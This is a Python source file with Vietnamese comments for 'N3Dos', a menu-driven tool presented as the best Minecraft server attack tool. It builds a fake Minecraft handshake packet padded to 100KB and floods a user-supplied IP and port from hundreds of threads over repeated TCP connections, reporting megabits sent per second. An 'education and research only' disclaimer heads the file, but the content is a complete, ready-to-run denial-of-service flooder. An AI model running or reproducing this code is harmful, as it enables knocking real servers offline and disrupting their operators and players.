# [==========================================================================================]
#
#       [1] - Tác giả: N3Co4
#       [2] - Github: https://github.com/N3Co4/N3Dos
#       [3] - Discord: @N3Co4
#       [4] - Mua VPS giá rẻ tại: https://vps247.cloud/
#       [5] - Liên hệ: maillite8@gmail.com
#
#       Lưu ý: Chương trình này chỉ được sử dụng cho mục đích giáo dục và nghiên cứu.
#              Miễn trừ trách nhiệm cho bất kỳ thiệt hại .
#              Nghiêm cấm buôn bán, tự xưng của mình, sao chép, phát tán mã nguồn.
#
#
# [==========================================================================================]

# =================== = NHẬP THƯ VIỆN PYTHON ====================
import os
import socket
import threading
import time
import struct

# ===================== CẤU HÌNH TẤN CÔNG =======================
PACKET_PER_CONN = 10000          # Số gói gửi mỗi kết nối TCP
STATS_INTERVAL = 1               # Thời gian cập nhật thống kê mỗi giây
DATA_PER_PACKET = 102400         # Kích thước mỗi gói dữ liệu gửi (100KB) để làm nghẽn băng thông
total_sent = 0                   # Tổng số byte đã gửi (được thống kê)
lock = threading.Lock()          # Khóa để tránh xung đột khi nhiều luồng cập nhật biến total_sent

# ===================== GIAO DIỆN CHÍNH ========================
def startup():
    # Xoá màn hình tùy theo hệ điều hành, sau đó hiện logo và menu
    os.system('cls' if os.name == 'nt' else 'clear')
    logo()
    menu()

def logo():
    # In logo + thông tin tác giả
    print("""
        ███╗   ██╗██████╗ ██████╗  ██████╗ ███████╗
        ████╗  ██║╚════██╗██╔══██╗██╔═══██╗██╔════╝
        ██╔██╗ ██║ █████╔╝██║  ██║██║   ██║███████╗
        ██║╚██╗██║ ╚═══██╗██║  ██║██║   ██║╚════██║
        ██║ ╚████║██████╔╝██████╔╝╚██████╔╝███████║
        ╚═╝  ╚═══╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
        Công cụ tấn công máy chủ Minecraft tốt nhất
        Tác giả: N3Co4
    """)

# In menu
def menu():
    while True:
        print("[", "="*60, "]")
        print("         [1] - Tấn công máy chủ Minecraft")
        print("         [2] - Tấn công máy chủ website (Đang phát triển)")
        print("         [3] - Giới thiệu")
        print("         [4] - Thoát")
        print("[", "="*60, "]")
        choice = input("\nLựa chọn của bạn: ").strip()

        if choice == '1':
            attack_minecraft()
        elif choice == '2':
            os.system('cls' if os.name == 'nt' else 'clear')
            print("[", "="*70, "]")
            print("")
            print("                 Chức năng này chưa được hoàn thiện.")
            print("")
            print("[", "="*70, "]")
            print("")
            print("Nhấn phím bất kỳ để quay lại menu chính...")
            input()
            os.system('cls' if os.name == 'nt' else 'clear')
            startup()
        elif choice == '3':
            os.system('cls' if os.name == 'nt' else 'clear')
            print("[", "="*70, "]")
            print("") 
            print("         [1] - Tác giả: N3Co4")
            print("         [2] - Github: https://github.com/N3Co4/N3Dos")
            print("         [3] - Discord: @N3Co4")
            print("         [4] - Mua VPS giá rẻ tại: https://vps247.cloud/")
            print("         [5] - Liên hệ: maillite8@gmail.com")
            print("") 
            print("[", "="*70, "]")
            print("")
            print("Nhấn phím bất kỳ để quay lại menu chính...")
            input()
            os.system('cls' if os.name == 'nt' else 'clear')
            startup()

        elif choice == '4':
            os.system('cls' if os.name == 'nt' else 'clear')
            print("Cảm ơn đã sử dụng chương trình của tôi!")
            exit()
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            print("Lựa chọn không hợp lệ, vui lòng thử lại.\n")

# ===================== XÂY DỰNG GÓI TIN GIẢ =======================
def build_fake_packet(ip, port):
    # Tạo một gói tin giả (fake packet) theo định dạng handshake của Minecraft
    ip_bytes = ip.encode()                   # Chuyển IP thành bytes
    packet = b'\x00' + b'\x04'               # Gói handshake header (protocol version + next state)
    packet += struct.pack('>B', len(ip_bytes)) + ip_bytes   # Thêm độ dài IP và IP
    packet += struct.pack('>H', port)        # Thêm cổng (2 byte, dạng big-endian)
    packet += b'\x01'                        # State = status
    handshake = struct.pack('>B', len(packet)) + packet      # Thêm chiều dài gói đầu
    request = b'\x01\x00'                    # Yêu cầu status
    # Trả về gói handshake + request và đệm thêm dữ liệu rác để đủ kích thước mỗi packet
    return handshake + request + b'\x00' * (DATA_PER_PACKET - len(handshake + request))

# ===================== LUỒNG GỬI DỮ LIỆU =======================
def sender(ip, port):
    global total_sent
    packet = build_fake_packet(ip, port)  # Chuẩn bị gói tin cần gửi
    while True:
        try:
            # Tạo kết nối TCP
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # Tắt Nagle để gửi ngay
                s.connect((ip, port))  # Kết nối tới mục tiêu
                for _ in range(PACKET_PER_CONN):
                    s.sendall(packet)  # Gửi gói tin
                    with lock:
                        total_sent += len(packet)  # Cập nhật tổng số byte đã gửi
        except:
            continue  # Nếu lỗi kết nối thì tiếp tục thử lại

# ===================== IN THỐNG KÊ TỐC ĐỘ GỬI =======================
def stats_printer():
    global total_sent
    prev = 0
    while True:
        time.sleep(STATS_INTERVAL)
        with lock:
            now = total_sent
        delta = now - prev
        prev = now
        mbps = (delta * 8) / (1024 * 1024)   # Đổi sang Mbps
        mb = delta / (1024 * 1024)           # Đổi sang MB
        print(f"[+] Đã gửi {mb:.2f} MB tới mục tiêu ({mbps:.2f} Mbps)")

# ===================== CHẠY TẤN CÔNG MINECRAFT =======================
def attack_minecraft():
    os.system('cls' if os.name == 'nt' else 'clear')
    # Nhập thông tin từ người dùng
    ip = input("Nhập IP máy chủ: ").strip()
    port = int(input("Nhập cổng (VD 25565): ").strip())
    thread_count = int(input("Số thread gửi (VD 500): ").strip())

    print(f"\nĐang gửi dữ liệu đến {ip}:{port} với {thread_count} threads...\n")

    # Tạo luồng in thống kê
    threading.Thread(target=stats_printer, daemon=True).start()

    # Tạo các luồng tấn công
    for _ in range(thread_count):
        t = threading.Thread(target=sender, args=(ip, port), daemon=True)
        t.start()

    while True:
        time.sleep(1)  # Giữ chương trình luôn chạy

# ===================== CHẠY CHƯƠNG TRÌNH =======================
if __name__ == '__main__':
    startup()
